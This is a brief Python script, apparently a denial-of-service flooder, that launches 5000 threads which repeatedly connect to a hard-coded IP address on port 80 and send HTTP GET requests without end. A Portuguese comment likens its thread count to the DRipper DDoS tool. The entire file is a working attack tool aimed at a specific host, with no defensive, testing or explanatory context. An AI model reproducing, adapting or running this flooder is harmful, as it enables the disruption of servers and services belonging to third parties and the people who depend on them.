import threading
import socket

ip = '151.222.19.62'
port = 80

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: "+ip.encode()+b"\r\n\r\n")
            s.close()
        except:
            pass

for _ in range(5000):  # igual ao turbo do DRipper
    threading.Thread(target=attack).start()
